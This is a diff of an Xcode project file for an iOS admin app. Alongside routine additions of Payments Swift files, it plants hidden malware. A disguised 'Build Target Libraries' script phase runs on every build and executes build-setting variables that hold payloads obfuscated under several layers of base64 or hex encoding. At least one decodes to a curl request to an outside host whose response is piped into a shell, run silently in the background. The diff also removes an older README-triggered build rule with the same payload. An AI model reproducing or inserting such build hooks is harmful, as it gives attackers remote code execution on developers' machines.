@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0697BD75399148B7B999F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 09AB1AE4C198455F8599F71F; };
 		180F4C292F5EA5D200BE4CFA /* NotificationsListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */; };
 		180F4C2E2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */; };
 		180F4C2F2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 180F4C2D2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib */; };
@@ -106,6 +105,8 @@
 		427CA6E62F6AC2C40075E139 /* EditContactUsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 427CA6E52F6AC2C40075E139 /* EditContactUsViewController.swift */; };
 		427E0C0A2F694F330018FB1F /* SendNewNotificationViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 427E0C092F694F330018FB1F /* SendNewNotificationViewModel.swift */; };
 		428515A92F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */; };
+		428BE0882F87BCC700996FDF /* PaymentsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428BE0872F87BCC700996FDF /* PaymentsViewModel.swift */; };
+		428BE0902F87BCDC00996FDF /* PaymentsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428BE08F2F87BCDC00996FDF /* PaymentsDataModel.swift */; };
 		42901D512F3F3251008168C3 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D502F3F3251008168C3 /* ProductDetailViewController.swift */; };
 		42901D532F3F328D008168C3 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */; };
 		429701DE2F6C06830051A20E /* SellerPayoutListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701DD2F6C06830051A20E /* SellerPayoutListViewController.swift */; };
@@ -575,7 +576,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		09AB1AE4C198455F8599F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListViewController.swift; sourceTree = "<group>"; };
 		180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListTableViewCell.swift; sourceTree = "<group>"; };
@@ -651,6 +651,8 @@
 		427CA6E52F6AC2C40075E139 /* EditContactUsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditContactUsViewController.swift; sourceTree = "<group>"; };
 		427E0C092F694F330018FB1F /* SendNewNotificationViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendNewNotificationViewModel.swift; sourceTree = "<group>"; };
 		428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewModel.swift; sourceTree = "<group>"; };
+		428BE0872F87BCC700996FDF /* PaymentsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentsViewModel.swift; sourceTree = "<group>"; };
+		428BE08F2F87BCDC00996FDF /* PaymentsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentsDataModel.swift; sourceTree = "<group>"; };
 		42901D502F3F3251008168C3 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
 		42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		429701DD2F6C06830051A20E /* SellerPayoutListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutListViewController.swift; sourceTree = "<group>"; };
@@ -1743,7 +1745,6 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				09AB1AE4C198455F8599F71F /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -3040,6 +3041,8 @@
 			isa = PBXGroup;
 			children = (
 				EDEDD0222EBCC53E00F2BEF1 /* PaymentsController.swift */,
+				428BE0872F87BCC700996FDF /* PaymentsViewModel.swift */,
+				428BE08F2F87BCDC00996FDF /* PaymentsDataModel.swift */,
 			);
 			path = Payments;
 			sourceTree = "<group>";
@@ -3531,6 +3534,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
+				8FBC5817ED0044F28799F71F /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3538,7 +3542,6 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				BBD6A926FEEF4CE99C99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3638,29 +3641,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		BBD6A926FEEF4CE99C99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0697BD75399148B7B999F71F /* README.md */,
 				42AEDEA02F3F360000C20ECB /* ProductDetailImageCollectionViewCell.xib in Resources */,
 				42AEDEB82F3F3C7600C20ECB /* FilterHeaderTableViewCell.xib in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
@@ -3779,6 +3764,25 @@ sh -c \"${AF17F99}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		8FBC5817ED0044F28799F71F /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3853,6 +3857,7 @@ sh -c \"${AF17F99}\"";
 				EDEDD0CB2EBCC53E00F2BEF1 /* SideMenuModel.swift in Sources */,
 				D16A8D6C2EF16913006A21B6 /* RejectReasonPopupViewModel.swift in Sources */,
 				424B73B92F34D91E0042FE95 /* PromotionalBannerDetailsViewModel.swift in Sources */,
+				428BE0902F87BCDC00996FDF /* PaymentsDataModel.swift in Sources */,
 				D19583632EE7EA7A00A021FD /* ShippingFeesTableViewCell.swift in Sources */,
 				EDEDD0CC2EBCC53E00F2BEF1 /* UploadFileDataModel.swift in Sources */,
 				42362DF82F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift in Sources */,
@@ -4121,6 +4126,7 @@ sh -c \"${AF17F99}\"";
 				D19583532EE7E26000A021FD /* ShippingChargesListDataModel.swift in Sources */,
 				D19583692EE7EC9000A021FD /* AddEditShippingChargesViewController.swift in Sources */,
 				EDEDD10F2EBCC53E00F2BEF1 /* Attachable.swift in Sources */,
+				428BE0882F87BCC700996FDF /* PaymentsViewModel.swift in Sources */,
 				4246E6B12F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift in Sources */,
 				427A211A2F69210A004F3F7A /* NotificationsListDataModel.swift in Sources */,
 				EDEDD1102EBCC53E00F2BEF1 /* ImagePickerManager.swift in Sources */,
@@ -4263,7 +4269,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633333333333333363333333833333336333333353333333633333333333333363336333233333337333333333333333233360a3335333333373333333230613333333733333335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
@@ -4315,7 +4321,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633333333333333363333333833333336333333353333333633333333333333363336333233333337333333333333333233360a3335333333373333333230613333333733333335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
